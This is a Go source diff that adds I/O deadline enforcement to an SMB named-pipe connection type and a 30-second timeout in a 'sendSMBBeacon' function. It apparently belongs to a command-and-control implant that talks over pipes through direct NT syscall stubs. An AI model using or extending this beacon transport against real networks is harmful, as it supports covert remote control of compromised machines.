@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -19,13 +20,31 @@ type smbConn struct {
 	sm         *syscallManager
 	mu         sync.Mutex
 	closed     bool
+	deadline   time.Time
 	localAddr  net.Addr
 	remoteAddr net.Addr
+}
+
+// checkDeadline enforces the stored I/O deadline before each blocking syscall.
+// The native pipe stubs cannot be interrupted mid-call, so the deadline is
+// checked on every Read/Write entry; an expired deadline fails the operation
+// instead of blocking forever on a stalled pipe peer.
+func (c *smbConn) checkDeadline() error {
+	c.mu.Lock()
+	dl := c.deadline
+	c.mu.Unlock()
+	if !dl.IsZero() && time.Now().After(dl) {
+		return os.ErrDeadlineExceeded
+	}
+	return nil
 }
 
 func (c *smbConn) Read(b []byte) (int, error) {
 	if c.closed {
 		return 0, io.ErrClosedPipe
+	}
+	if err := c.checkDeadline(); err != nil {
+		return 0, err
 	}
 	n, err := syscallNtReadPipe(c.sm, c.handle, b)
 	if err != nil {
@@ -40,6 +59,9 @@ func (c *smbConn) Read(b []byte) (int, error) {
 func (c *smbConn) Write(b []byte) (int, error) {
 	if c.closed {
 		return 0, io.ErrClosedPipe
+	}
+	if err := c.checkDeadline(); err != nil {
+		return 0, err
 	}
 	total := 0
 	for total < len(b) {
@@ -67,9 +89,16 @@ func (c *smbConn) Close() error {
 
 func (c *smbConn) LocalAddr() net.Addr                { return c.localAddr }
 func (c *smbConn) RemoteAddr() net.Addr               { return c.remoteAddr }
-func (c *smbConn) SetDeadline(t time.Time) error      { return nil }
-func (c *smbConn) SetReadDeadline(t time.Time) error  { return nil }
-func (c *smbConn) SetWriteDeadline(t time.Time) error { return nil }
+
+func (c *smbConn) SetDeadline(t time.Time) error {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	c.deadline = t
+	return nil
+}
+
+func (c *smbConn) SetReadDeadline(t time.Time) error  { return c.SetDeadline(t) }
+func (c *smbConn) SetWriteDeadline(t time.Time) error { return c.SetDeadline(t) }
 
 type smbAddr struct{ name string }
 
@@ -203,6 +232,7 @@ func sendSMBBeacon(body []byte) []byte {
 		return nil
 	}
 	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
 	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
 		if Debug {
